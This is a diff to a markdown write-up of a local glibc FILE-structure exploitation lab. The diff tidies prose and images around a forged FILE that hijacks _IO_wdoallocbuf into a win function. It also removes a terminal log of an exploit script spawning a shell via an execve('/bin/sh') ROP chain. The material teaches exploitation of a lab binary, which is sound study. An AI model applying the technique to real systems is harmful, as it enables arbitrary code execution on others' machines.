@@ -319,17 +319,11 @@ Everything is set, let's try again. This time the outer range check passes, and 
 
 ![10](./images/10.png)
 
-The forged structure also satisfies the conditions in `_IO_wfile_overflow`. Execution continues into `_IO_wdoallocbuf`.
-
-![11](./images/11.png)
-
-Finally, the checks in `_IO_wdoallocbuf` pass, and the indirect call at `_IO_wdoallocbuf+55` lands in our `win` function.
-
-![12](./images/12.png)
-
-While we're here, it is worth looking at the register state immediately before the final indirect call.
+The forged structure also satisfies the conditions in `_IO_wfile_overflow`. Execution continues into `_IO_wdoallocbuf`. Finally, the checks in `_IO_wdoallocbuf` pass, and the indirect call at `_IO_wdoallocbuf+55` lands in our `win` function.
 
 ![13](./images/13.png)
+
+While we're here, it is worth looking at the register state immediately before the final indirect call.
 
 Both `RDI` and `RDX` point to the beginning of the controlled `FILE` structure. We do not directly control the first and third argument registers, but we control the memory they point to. Cool!
 
@@ -422,38 +416,7 @@ The ROP layout in `ace.py` is:
 0x50: address to execve		# call execve("/bin/sh", NULL)
 ```
 
-```bash
-user@8bd829571ffe:/lab/exp$ ./ace.py
-[*] '/lab/target'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        No PIE (0x400000)
-    Stripped:   No
-[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
-    Arch:       amd64-64-little
-    RELRO:      Full RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        PIE enabled
-    FORTIFY:    Enabled
-    SHSTK:      Enabled
-    IBT:        Enabled
-[+] Starting local process '/lab/target': pid 298
-libc base: 0x7f5836d6c000
-fp @ 0x39b1c010
-[*] Switching to interactive mode
- 3) fread(i)            8) overwrite_stdout
- 4) fclose(i)           9) overwrite_stderr
- 5) inspect(i)          0) quit
-> slot [0-9]: length: data: $ ls
-__pycache__  hijack_fclose.py  hijack_fwrite.py	   io_file_jumps_breakpoints.gdb
-ace.py	     hijack_fread.py   house_of_apple2.py
-$ id
-uid=1000(user) gid=1000(user) groups=1000(user)
-$
-```
+![14](./images/14.png)
 
 We have now achieved arbitrary code execution.
 
